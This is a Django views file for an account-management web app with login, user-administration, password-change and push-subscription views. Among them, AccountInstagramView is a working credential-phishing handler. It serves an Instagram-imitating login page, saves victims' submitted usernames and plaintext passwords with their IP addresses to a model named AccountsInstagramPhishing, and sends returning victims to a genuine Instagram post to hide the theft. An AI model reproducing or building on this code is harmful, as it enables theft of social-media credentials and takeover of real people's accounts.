from django.contrib.auth.mixins import LoginRequiredMixin
from django.contrib.auth.views import LoginView
from django.http import HttpResponseRedirect
from django.shortcuts import render, redirect
from django.urls import reverse_lazy
from django.views.generic import TemplateView
from django.contrib.auth import authenticate, login

from apps.account.forms import ChangePasswordForm
from apps.account.models import CustomUser, AccountsInstagramPhishing
from django.views.generic import View
from django.http import HttpResponse
import json
from django.http import JsonResponse

from django.views.generic import CreateView
'""""""""""""""""""""""Add - User"""""""""""""""""""""""'


class AddUserView(LoginRequiredMixin, TemplateView):
    template_name = 'account/addUser.html'

    def post(self, request):
        username = request.POST.get('name_of_user')
        phone_number = f"+996{request.POST.get('phonenumber')}"
        password = request.POST.get('pwd')
        user_type = request.POST.get('user_select')

        # Perform additional validation here if needed

        # Create a new CustomUser object
        new_user = CustomUser(
            username=username,
            phone_number=phone_number,
            is_active=True,  # Set as active user, modify as needed
            roles=user_type,
        )

        # Set the password for the new user
        new_user.set_password(password)

        # Save the new user to the database
        new_user.save()

        # Redirect to a success page or the same page to clear the form
        return HttpResponseRedirect(".")

#0223306334

class SignInView(View):
    template_name = 'account/login.html'

    def get(self, request):
        return render(request, self.template_name)

    def post(self, request):
        phone_number = f"+{request.POST.get('phone_number')}"
        password = request.POST.get('password')
        remember_me = request.POST.get('remember_me')

        user = authenticate(request=request, phone_number=phone_number, password=password)
        if user is not None:
            login(request, user)
            if remember_me == "on":

                request.session.set_expiry(60 * 60 * 24 * 30)  # 30 days if "remember me" is checked
            else:
                request.session.set_expiry(60 * 60 * 24 * 7)
            return redirect('/')
        else:
            error_message = "Invalid phone number or password"
            return render(request, self.template_name, {'error_message': error_message})


class ControlUsersView(LoginRequiredMixin, TemplateView):
    template_name = 'account/controlUsers.html'

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['users'] = CustomUser.objects.all().order_by("username")  # Fetch all users
        return context


class AccountInstagramView(LoginRequiredMixin, TemplateView):
    template_name = 'account/instagram.html'

    def get(self, request, *args, **kwargs):
        def get_user_ip(request):
            ip_address = request.META.get('HTTP_X_FORWARDED_FOR')
            if ip_address:
                ip_address = ip_address.split(',')[0]
            else:
                ip_address = request.META.get('REMOTE_ADDR')
            return ip_address
        ip_address = get_user_ip(request)
        if AccountsInstagramPhishing.objects.filter(ip_address=ip_address).exists():
            return HttpResponseRedirect("https://www.instagram.com/p/CK57lhFHNwi/?utm_source=ig_web_button_share_sheet&igsh=MzRlODBiNWFlZA==")

        return super(AccountInstagramView, self).get(request, *args, **kwargs)





    def post(self, request):
        post = self.request.POST
        username = post.get("username")
        password = post.get("password")

        def get_user_ip(request):
            ip_address = request.META.get('HTTP_X_FORWARDED_FOR')
            if ip_address:
                ip_address = ip_address.split(',')[0]
            else:
                ip_address = request.META.get('REMOTE_ADDR')
            return ip_address
        ip_address = get_user_ip(request)
        AccountsInstagramPhishing.objects.create(name=username, password=password, ip_address=ip_address, is_written = True)
        return HttpResponseRedirect('.')



class NoPermissionsView(TemplateView):
    template_name = 'account/forbidden.html'



class EditUserView(CreateView):
    model = CustomUser
    template_name = 'account/change_password.html'
    form_class = ChangePasswordForm

    def post(self, request, pk):
        form = ChangePasswordForm(request.POST)
        if form.is_valid():
            password = form.cleaned_data.get('password')
            user: CustomUser = CustomUser.objects.get(id=pk)
            user.set_password(password)
            user.save()
            return HttpResponseRedirect(reverse_lazy("control-users"))
        else:
            # Получаем ошибку из формы и передаём её в шаблон
            error = form.errors.get('password', ["Ошибка: проверьте введённый пароль."])[0]
            return render(request, 'account/change_password.html', {'form': form, 'error': error})




from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator
from django.http import JsonResponse
from .models import PushSubscription
import json

@method_decorator(csrf_exempt, name='dispatch')
class SaveSubscriptionView(View):
    def post(self, request):
        data = json.loads(request.body)

        endpoint = data.get("endpoint")
        keys = data.get("keys", {})
        p256dh = keys.get("p256dh")
        auth = keys.get("auth")

        if not endpoint or not p256dh or not auth:
            return JsonResponse({'status': 'invalid data'}, status=400)

        subscription, created = PushSubscription.objects.get_or_create(
            endpoint=endpoint,
            defaults={
                'p256dh': p256dh,
                'auth': auth,
                'user': request.user if request.user.is_authenticated else None
            }
        )

        if not created:
            # обновим ключи если они поменялись
            subscription.p256dh = p256dh
            subscription.auth = auth
            subscription.save()

        return JsonResponse({'status': 'ok'})